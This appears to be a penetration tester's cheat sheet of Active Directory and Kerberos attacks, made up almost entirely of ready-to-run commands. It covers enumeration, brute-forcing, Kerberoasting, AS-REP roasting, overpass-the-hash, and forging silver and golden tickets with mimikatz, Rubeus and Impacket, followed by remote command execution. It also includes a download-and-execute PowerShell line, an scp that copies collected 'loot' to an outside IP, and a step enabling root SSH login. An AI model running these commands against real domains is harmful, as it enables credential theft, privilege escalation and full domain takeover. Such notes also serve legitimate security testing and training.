## Tickets

### Attack Privilege Requirements
- Kerbrute Enumeration
	- No domain access required 

- Pass the Ticket
	- Access as a user to the domain required

- Kerberoasting
	- Access as any user required

- AS-REP Roasting
	- Access as any user required

- Golden Ticket
	- Full domain compromise (domain admin) required 

- Silver Ticket
	- Service hash required 

- Skeleton Key
	- Full domain compromise (domain admin) required

### Enumeration

- in PowerShell
	- with PowerUp
		- Commands
			- `/PowerSploit/Privesc/PowerUp.ps1`
			- `Invoke-AllChecks`
		- [Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

	- with Powerview

		- Commands
			- `powershell -ep bypass`
			- `Powerview.ps1`
			- `Get-NetUser | select cn`
			- `Get-NetGroup -GroupName *admin*`
			- `Invoke-ShareFinder`
			- `Get-NetComputer -fulldata | select operatingsystem`
		- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
		- [Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
		
	- with Bloodhound
		- Commands
			- `apt-get install bloodhound`
			- `neo4j console`
			- `Powershell –ep bypass`
			- `. .\SharpHound.ps1`
			- `Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip`
			- `vi /etc/ssh/sshd_config`
			- `PermitRootLogin yes`
			- `systemctl start ssh.socket`
			- `scp .\20200609093439_loot.zip root@10.9.17.195:/root/loot.zip`
			- `bloodhound`
		- [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)

	- with Traditional Approach
		- Commands
			- `net user`
			- `net user /domain`
			- `net user admin /domain`
			- `net group /domain`

- in Kali Linux

	- Kerbrute
		- Commands
			- `./kerbrute_linux_amd64 userenum -d $DOMAIN -dc $DOMAIN_CONTROLLER usernames.txt`
		- [Kerbrute](https://github.com/ropnop/kerbrute/releases/)
		
	- Enum4Linux
		- Commands
			- `enum4linux -A $IP`

### Harvesting & Brute-Force

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe harvest /interval:30`
			- `Rubeus.exe brute /password:$PASSWORD /noticket`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

- in Kali Linux

	- Kerbrute
		- Commands
			- `./kerbrute_linux_amd64 -domain $DOMAIN -users usernames.txt -passwords passwords.txt -outputfile Output_File`
		- [Kerbrute](https://github.com/ropnop/kerbrute)

### Overass The Hash / Pass The Key

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec
		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket
		- Commands
			- with Hash
				- `getTGT.py $DOMAIN/$DOMAIN_USER -hashes [lm_hash]:$NTLM_HASH`
			- with aesKey
				- `getTGT.py $DOMAIN/$DOMAIN_USER -aesKey $AES_KEY`
			- with Password
				- `getTGT.py $DOMAIN/$DOMAIN_USER:$PASSWORD`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Pass The Ticket

### Kerberoasting

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe kerberoast`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- IEX
		- Commands
			- `iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1") 
			- `Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs`
		- [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

	- Mimikatz
		- [How to kerberoast](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

- in Kali Linux

	- Impacket
		- Commands
			- `GetUserSPNs.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP -outputfile Output_TGSs`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

- Cracking
	- [Kirbi To John](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/kirbi2john.py)

	- Hashcat
		- `hashcat -m 13100 --force <TGSs_file> <passwords_file>`

	- John
		- `john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>`

	- Request Service Tickets for service account SPNs
		- in Powershell
		- Add-Type –AssemblyName System.IdentityModel
		- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’

	- Extract Service Tickets Using Mimikatz
		- kerberos::list /export

	- Crack the Tickets
		- tgsrepcrack.py *.kirbi $WORDLIST

	- [URL](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)
	- [URL](https://www.eshlomo.us/kerberoasting-extracting-service-account-password/)

### AS-REP Roasting

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:Output_Hashes`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

- in Kali Linux

	- Impacket
		- Commands
			- with Credentials
				- `GetNPUsers.py $DOMAIN/$DOMAIN_USER:$PASSWORD -request -format <AS_REP_responses_format [hashcat | john]> -outputfile Output_AS_REP_Responses`
			- no Credentials
				- `GetNPUsers.py $DOMAIN/ -usersfile usernames.txt -format <AS_REP_responses_format [hashcat | john]> -outputfile Output_AS_REP_Responses`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

- Cracking
	- Hashcat
		- `hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>`
	- John
		- `john --wordlist=<passwords_file> <AS_REP_responses_file>`

### Silver Ticket

- in PowerShell

	- Mimikatz
		- Commands
			- with NTLM
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME`
			- with aesKey
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME`
			- with Mimikatz
				- `mimikatz # kerberos::ptt <ticket_kirbi_file>`
		- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

	- Rubeus
		- Commands
			- `Rubeus.exe ptt /ticket:<ticket_kirbi_file>`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec
		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket
		- Commands
			- with NTLM
				- `ticketer.py -nthash $NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
			- with aesKey
				- `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN -SPN $SERVICE_SPN $DOMAIN_USER`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Golden Ticket

- in PowerShell

	- Mimikatz

		- Commands
			- with NTLM
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /rc4:$NTLM_HASH /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME`
			- with aesKey
				- `mimikatz # kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /target:$SERVICE_MACHINE_HOSTNAME`
			- with Mimikatz
				- `mimikatz # kerberos::ptt <ticket_kirbi_file>`
		- [Mimikatz](https://github.com/gentilkiwi/mimikatz)

	- Rubeus

		- Commands
			- `Rubeus.exe ptt /ticket:<ticket_kirbi_file>`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec

		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket

		- Commands
			- with NTLM
				- `ticketer.py -nthash $KRBTGT_NTLM_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
			- with aesKey
				- `ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN $DOMAIN_USER`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)

### Skeleton Ticket

### Extra Mile

- NTLM from password

	- `python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'`

- [Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

- [Mimikatz History](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)
